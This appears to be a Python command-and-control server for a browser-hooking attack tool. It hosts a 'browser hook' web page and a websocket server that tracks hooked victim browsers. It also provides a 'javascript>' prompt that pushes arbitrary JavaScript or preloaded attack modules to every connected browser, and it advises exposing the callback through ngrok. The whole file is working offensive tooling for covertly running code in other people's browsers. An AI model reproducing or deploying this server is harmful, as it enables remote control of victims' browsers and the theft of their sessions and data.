import asyncio
from websockets.asyncio.server import serve
from scripts import scripts
from pathlib import Path
import threading
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from functools import partial
import time
import os
from prompt_toolkit import PromptSession
from prompt_toolkit import print_formatted_text

session = PromptSession()

class QuietHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

def start_web_server(ip,port):
    handler = partial(QuietHandler, directory="page")
    server = ThreadingHTTPServer((ip, port), handler)
    print(f"\nHosting website at: {ip,port}.")
    server.serve_forever()

CLIENTS = set()

async def conncted():
    last_count = len(CLIENTS)
    while True:
        current_count = len(CLIENTS)
        if current_count != last_count:
            print_formatted_text(f"CLIENTS: {len(CLIENTS)}")
            last_count = current_count
        await asyncio.sleep(0.1)

async def broadcast():

    asyncio.create_task(conncted())
    while True:
        for client in CLIENTS:
            m = await client.recv()
            print(m)

        cmd = await session.prompt_async("javascript> ")
        if cmd == "help":
            print("\nhelp, loads this page.")
            print("Typing in \"javscript>\" runs the input as javascript, unless the input is a recognized command.")
            print("Load, [module], run selected script in browser.")
            print("modules, list all mudules avaiable.")
            print("clear, clears screen")
            print("quit/exit, exits program.\n")

        if cmd == "clear":
            os.system("clear")
            
        if cmd == "modules":
            for script in scripts:
                print('\t',script)

        if cmd.startswith("load "):
            module = cmd[5:]
            if module != '':
                if module not in scripts:
                    print(f"Module {module} doesn't exist")
                    message = ""
                else:
                    message = f"{scripts[module]()}"
            else:
                print("No mudule supplied.")
                message = ""
        else:
            message = cmd
        if message in {"quit", "exit"}:
            break
        if message == '':
            message = "" 
        await asyncio.gather(
            *(client.send(message) for client in CLIENTS),
            return_exceptions=True,
        )

async def handler(websocket):
    CLIENTS.add(websocket)
    
    try:
        await websocket.wait_closed()
    finally:
        CLIENTS.remove(websocket)

async def main(ip, port):
    print(f"Hosting server at: {ip}:{port}.\n")
    print("Browser can have false positives and vice versa.")
    print("Type \"help\" to load help menu \n")

    async with serve(handler, ip, port):
        await broadcast()

ip = input("Hosting IP: ")
port = input("Port: ")
print("")
web_ip = input("Browser hook hosting IP: ")
web_port = input("Port: ")

if Path("page/websocket_config.json").exists():
    with open("page/websocket_config.json", "w") as sock_addr:
        print(f"\nNote use: `ngrok http {ip}:{port}` forwarding link if hosting online.")
        cal_bck_addr = input("Browserhook full websocket call back address: ")
        sock_addr_config = f"{{\"websocket_url\":\"{cal_bck_addr}\"}}\n"
        sock_addr.write(sock_addr_config)
        sock_addr.close()
else:
    print("file page/websocket_config.json not found")
    exit()

threading.Thread(target=start_web_server, args=(web_ip,int(web_port)),daemon=True).start()
time.sleep(5)
asyncio.run(main(ip,int(port)))
